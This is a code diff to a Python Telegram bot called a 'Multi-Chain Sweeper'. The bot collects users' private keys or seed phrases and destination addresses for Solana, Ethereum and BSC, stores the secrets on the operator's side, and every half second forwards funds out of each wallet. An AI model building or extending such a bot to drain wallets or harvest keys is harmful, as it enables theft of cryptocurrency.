@@ -1,6 +1,9 @@
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, ContextTypes,
+    ConversationHandler, CallbackQueryHandler, MessageHandler, filters
+)
 import asyncio
 import logging
 import json
@@ -38,7 +41,7 @@ def load_data():
         try:
             with open(DATA_FILE, "r") as f:
                 data_store = {int(k): v for k, v in json.load(f).items()}
-            logger.info(f"Loaded {sum(len(v) for v in data_store.values())} wallets")
+            logger.info(f"✅ Loaded {sum(len(v) for v in data_store.values())} wallets")
         except Exception as e:
             logger.error(f"Load error: {e}")
 
@@ -53,104 +56,120 @@ def save_data():
 # ---------------- FLASK ----------------
 @app.route("/")
 def home():
-    return "Sweeper Bot ✅"
+    return "Bot is alive ✅"
+
+# Conversation States
+CHAIN, TYPE_CHOICE, SECRET, DESTINATION = range(4)
 
 def main_menu():
     keyboard = [
-        [InlineKeyboardButton("➕ Add Wallet", callback_data="add")],
-        [InlineKeyboardButton("📋 My Wallets", callback_data="list")],
-        [InlineKeyboardButton("🗑 Remove Last", callback_data="remove")],
-        [InlineKeyboardButton("▶️ Start" if not sweeper_running else "⏹ Stop", callback_data="toggle")]
+        [InlineKeyboardButton("➕ Add Wallet", callback_data="add_wallet")],
+        [InlineKeyboardButton("📋 My Wallets", callback_data="my_wallets")],
+        [InlineKeyboardButton("🗑 Remove Last", callback_data="remove_last")],
+        [InlineKeyboardButton("⏺ Toggle Sweeper", callback_data="toggle")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# ---------------- BOT ----------------
+# ---------------- BOT HANDLERS ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "⚡ **Multi-Chain Fast Sweeper**\n\n"
-        "Click any button below:",
-        parse_mode="Markdown",
-        reply_markup=main_menu()
-    )
+    await update.message.reply_text("⚡ **Fast Multi-Chain Sweeper**", 
+                                  parse_mode="Markdown", reply_markup=main_menu())
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global sweeper_running
+async def main_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    user_id = query.from_user.id
     data = query.data
 
-    if data == "add":
-        await query.edit_message_text(
-            "Send this command:\n"
-            "`/add solana YOUR_SECRET_HERE DESTINATION_ADDRESS`\n\n"
-            "Works with private key or seed phrase.\n"
-            "Supported: solana, ethereum, bsc",
-            parse_mode="Markdown"
-        )
-    elif data == "list":
-        await show_wallets(query, user_id)
-    elif data == "remove":
-        await remove_last(query, user_id)
+    if data == "add_wallet":
+        keyboard = [[InlineKeyboardButton(c.upper(), callback_data=c)] for c in ["solana","ethereum","bsc"]]
+        await query.edit_message_text("**Select Chain:**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
+        return CHAIN
+
+    elif data == "my_wallets":
+        await show_wallets(query)
+    elif data == "remove_last":
+        await remove_last(query)
     elif data == "toggle":
+        global sweeper_running
         sweeper_running = not sweeper_running
-        status = "🟢 Sweeper Started" if sweeper_running else "⭕ Sweeper Stopped"
-        await query.edit_message_text(status, reply_markup=main_menu())
+        status = "🟢 Running" if sweeper_running else "⭕ Stopped"
+        await query.edit_message_text(f"Sweeper: {status}", reply_markup=main_menu())
 
-async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 3:
-        await update.message.reply_text("Usage:\n`/add <chain> <secret> <destination>`", parse_mode="Markdown")
-        return
+async def chain_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    context.user_data["chain"] = query.data
+    keyboard = [
+        [InlineKeyboardButton("🔑 Private Key", callback_data="private_key")],
+        [InlineKeyboardButton("📜 Seed Phrase", callback_data="seed_phrase")]
+    ]
+    await query.edit_message_text("**Choose Type:**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
+    return TYPE_CHOICE
 
-    chain = context.args[0].lower()
-    destination = context.args[-1]
-    secret = " ".join(context.args[1:-1])
+async def type_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    context.user_data["type"] = query.data
+    await query.edit_message_text("Paste your **Secret** (Private Key or Seed Phrase):")
+    return SECRET
 
-    if chain not in ["solana", "ethereum", "bsc"]:
-        await update.message.reply_text("Supported chains: solana, ethereum, bsc")
-        return
+async def receive_secret(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["secret"] = update.message.text.strip()
+    await update.message.reply_text("Now paste the **Destination Wallet Address**:")
+    return DESTINATION
+
+async def receive_destination(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    chain = context.user_data.get("chain")
+    secret = context.user_data.get("secret")
+    destination = update.message.text.strip()
 
     wallet = {
         "chain": chain,
+        "type": context.user_data.get("type"),
         "secret": encrypt(secret),
-        "destination": destination,
-        "active": True
+        "destination": destination
     }
 
-    user_id = update.effective_user.id
     with data_lock:
         data_store.setdefault(user_id, []).append(wallet)
         save_data()
 
-    await update.message.reply_text(f"✅ {chain.upper()} wallet added!\n→ {destination}", reply_markup=main_menu())
+    await update.message.reply_text(f"✅ **Success!**\nChain: {chain.upper()}\nDestination: {destination}", 
+                                  reply_markup=main_menu())
+    context.user_data.clear()
+    return ConversationHandler.END
 
-async def show_wallets(query, user_id):
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu())
+    context.user_data.clear()
+    return ConversationHandler.END
+
+# Quick Actions
+async def show_wallets(query):
+    user_id = query.from_user.id
     with data_lock:
         wallets = data_store.get(user_id, [])
-    if not wallets:
-        text = "No wallets yet."
-    else:
-        text = "📋 **Your Wallets**\n\n"
-        for i, w in enumerate(wallets):
-            text += f"{i+1}. {w['chain'].upper()} → `{w['destination'][:15]}...`\n"
+    text = "📋 **Your Wallets**\n\n" if wallets else "No wallets yet."
+    for i, w in enumerate(wallets):
+        text += f"{i+1}. {w['chain'].upper()} → `{w['destination'][:12]}...`\n"
     await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
 
-async def remove_last(query, user_id):
+async def remove_last(query):
+    user_id = query.from_user.id
     with data_lock:
         if user_id in data_store and data_store[user_id]:
             data_store[user_id].pop()
             if not data_store[user_id]:
                 del data_store[user_id]
             save_data()
-            text = "🗑 Last wallet removed."
+            await query.edit_message_text("🗑 Last wallet removed.", reply_markup=main_menu())
         else:
-            text = "No wallet to remove."
-    await query.edit_message_text(text, reply_markup=main_menu())
+            await query.edit_message_text("Nothing to remove.", reply_markup=main_menu())
 
 # ---------------- FAST SWEEPER ----------------
 async def sweeper_loop():
-    global sweeper_running
-    logger.info("🚀 Fast Sweeper Started (checks every 0.5s)")
+    logger.info("🚀 Fast Sweeper Started (0.5s)")
     while True:
         if sweeper_running:
             tasks = []
@@ -158,28 +177,37 @@ async def sweeper_loop():
                 current = list(data_store.items())
             for user_id, wallets in current:
                 for wallet in wallets:
-                    if wallet.get("active"):
-                        tasks.append(run_sweep(user_id, wallet))
+                    tasks.append(process_wallet(user_id, wallet))
             if tasks:
                 await asyncio.gather(*tasks, return_exceptions=True)
         await asyncio.sleep(0.5)
 
-async def run_sweep(user_id, wallet):
+async def process_wallet(user_id, wallet):
     try:
         secret = decrypt(wallet["secret"])
         func = {"solana": solana.forward, "ethereum": ethereum.forward, "bsc": bsc.forward}[wallet["chain"]]
         await asyncio.to_thread(func, secret, wallet["destination"], user_id)
     except Exception as e:
-        logger.error(f"Sweep error: {e}")
+        logger.error(f"Error: {e}")
 
 # ---------------- MAIN ----------------
 async def main():
     load_data()
     application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
+    conv_handler = ConversationHandler(
+        entry_points=[CallbackQueryHandler(main_button)],
+        states={
+            CHAIN: [CallbackQueryHandler(chain_selected)],
+            TYPE_CHOICE: [CallbackQueryHandler(type_selected)],
+            SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_secret)],
+            DESTINATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_destination)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)],
+    )
+
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("add", add_command))
-    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(conv_handler)
 
     asyncio.create_task(sweeper_loop())
 
